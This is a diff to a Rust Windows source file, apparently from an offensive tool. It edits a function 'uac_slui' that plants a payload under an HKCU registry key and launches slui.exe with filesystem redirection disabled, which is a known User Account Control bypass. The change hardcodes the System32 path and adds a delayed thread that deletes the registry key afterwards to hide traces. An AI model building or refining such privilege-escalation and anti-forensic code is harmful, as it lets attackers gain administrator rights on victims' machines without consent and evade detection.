@@ -1,7 +1,6 @@
 #[cfg(target_os = "windows")]
 mod fsr;
 use winreg::enums;
-use winreg::enums::{};
 use std::ffi::CString;
 use std::fs::File;
 use std::io::Write;
@@ -19,8 +18,6 @@ use winapi::um::winuser::{SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETUR
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 
-#[cfg(target_os = "windows")]
-use enums::HKEY_CURRENT_USER;
 #[cfg(target_os = "windows")]
 use winreg::RegKey;
 
@@ -213,9 +210,19 @@ pub fn uac_slui(payload: &String) {
 
     thread::sleep(Duration::from_secs(3));
 
-    if let Err(_) = launch_with_fsr_disabled("slui.exe") {
+    let slui_path = "C:\\Windows\\System32\\slui.exe";
+
+    if let Err(_) = launch_with_fsr_disabled(slui_path) {
         let _ = delete_hkcu_key(path);
+        return;
     }
+
+    // Cleanup registry after slui has had time to process
+    let cleanup_path = path.to_string();
+    thread::spawn(move || {
+        thread::sleep(Duration::from_secs(5));
+        let _ = delete_hkcu_key(&cleanup_path);
+    });
 }
 
 /// Main UAC elevation entry
